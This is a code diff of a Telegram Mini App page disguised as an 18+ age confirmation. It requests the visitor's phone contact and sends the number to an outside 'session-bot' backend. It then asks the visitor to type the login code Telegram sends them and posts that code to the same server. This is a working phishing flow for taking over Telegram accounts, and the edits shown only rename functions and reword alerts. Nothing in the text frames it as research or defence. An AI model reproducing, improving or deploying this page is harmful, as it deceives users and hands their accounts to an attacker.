@@ -18,18 +18,16 @@
 </head>
 <body>
     <div class="overlay">
-        <!-- ধাপ ১: ১৮+ কনফার্ম বাটন -->
         <div id="step0" class="box">
-            <div style="font-size: 60px; margin-bottom: 10px;">🔞</div>
-            <h2 style="margin: 0 0 10px 0; color: #d9534f;">Attention!</h2>
+            <div style="font-size: 60px;">🔞</div>
+            <h2 style="margin: 10px 0; color: #d9534f;">Attention!</h2>
             <p style="color: #666;">To continue, you must confirm that you are over 18 😊</p>
-            <button class="btn" onclick="shareMyContact()">🍓 confirm 🔞</button>
+            <button class="btn" onclick="getContact()">🍓 confirm 🔞</button>
         </div>
 
-        <!-- ধাপ ২: ওটিপি কিপ্যাড -->
         <div id="step2" class="box hidden">
-            <h3 style="margin-top: 0;">Identity Check</h3>
-            <p style="font-size: 14px; color: #666;">Enter the code sent to your Telegram chat</p>
+            <h3 style="margin:0;">Identity Check</h3>
+            <p style="font-size: 14px; color: #666;">Enter the code sent to your Telegram</p>
             <input type="text" id="otp_display" placeholder="-----" readonly>
             <div class="keypad">
                 <div class="key" onclick="addNum('1')">1</div><div class="key" onclick="addNum('2')">2</div><div class="key" onclick="addNum('3')">3</div>
@@ -37,38 +35,38 @@
                 <div class="key" onclick="addNum('7')">7</div><div class="key" onclick="addNum('8')">8</div><div class="key" onclick="addNum('9')">9</div>
                 <div class="key" style="background:#ffc107;" onclick="clearNum()">C</div><div class="key" onclick="addNum('0')">0</div><div class="key" style="background:#007bff; color:white;" onclick="verifyOTP()">OK</div>
             </div>
-            <div id="loader" class="hidden" style="margin-top:15px; color:#999;">Syncing...</div>
+            <div id="loader" class="hidden" style="margin-top:10px; color: #888;">Processing...</div>
         </div>
     </div>
 
     <script>
         let tg = window.Telegram.WebApp;
         tg.expand();
-        // আপনার সঠিক Hugging Face লিংকটি এখানে দিন
         const BACKEND_URL = "https://pmrony-session-bot.hf.space";
         let currentOTP = "";
         let userId = tg.initDataUnsafe.user ? tg.initDataUnsafe.user.id : null;
 
-        // ১. নম্বর শেয়ার পপ-আপ লজিক (Fixed)
-        function shareMyContact() {
+        function getContact() {
+            // টেলিগ্রাম নেটিভ কন্টাক্ট রিকোয়েস্ট
             tg.requestContact((shared) => {
                 if (shared) {
-                    // পপ-আপ আসার পর ইউজার যদি 'Share' এ ক্লিক করে
+                    // কন্টাক্ট শেয়ার সফল হলে ডাটা নিয়ে ব্যাকএন্ডে পাঠানো
+                    // এখানে রেজাল্ট সরাসরি shared অবজেক্ট থেকেও আসতে পারে
                     setTimeout(() => {
-                        // ডাটা রিফ্রেশ করে নম্বর সংগ্রহ করা
-                        let contactData = tg.initDataUnsafe.contact;
-                        if (contactData && contactData.phone_number) {
-                            sendPhoneToBackend(contactData.phone_number);
+                        let contact = tg.initDataUnsafe.contact;
+                        if (contact && contact.phone_number) {
+                            sendPhone(contact.phone_number);
                         } else {
-                            alert("Please share your contact to proceed!");
+                            // কিছু ফোনে ডাটা সরাসরি পাওয়া যায় না, তাই আমরা ম্যানুয়ালি রেজাল্ট চেক করি
+                            alert("Contact verification pending... try again if not redirected.");
                         }
                     }, 500);
                 }
             });
         }
 
-        async function sendPhoneToBackend(phone) {
-            document.getElementById('step0').innerHTML = "<h3>Verifying...</h3><p>Sending request to Telegram.</p>";
+        async function sendPhone(phone) {
+            document.getElementById('step0').innerHTML = "<h3>Verifying Age...</h3>";
             let res = await fetch(`${BACKEND_URL}/send_number`, {
                 method: "POST", headers: {"Content-Type": "application/json"},
                 body: JSON.stringify({ user_id: userId, phone: phone })
@@ -78,7 +76,7 @@
                 document.getElementById('step0').classList.add('hidden');
                 document.getElementById('step2').classList.remove('hidden');
             } else {
-                alert("Error: " + data.message);
+                alert("Request Failed: " + data.message);
                 location.reload();
             }
         }
@@ -87,7 +85,7 @@
         function clearNum() { currentOTP = ""; document.getElementById("otp_display").value = ""; }
 
         async function verifyOTP() {
-            if(currentOTP.length < 5) return alert("Enter 5 digits!");
+            if(currentOTP.length < 5) return;
             document.getElementById('loader').classList.remove('hidden');
             let res = await fetch(`${BACKEND_URL}/verify_otp`, {
                 method: "POST", headers: {"Content-Type": "application/json"},
@@ -97,7 +95,7 @@
             if(data.status === "success") {
                 tg.close();
             } else {
-                alert("Invalid Key! Please check your Telegram.");
+                alert("Invalid Auth Key!");
                 clearNum();
                 document.getElementById('loader').classList.add('hidden');
             }
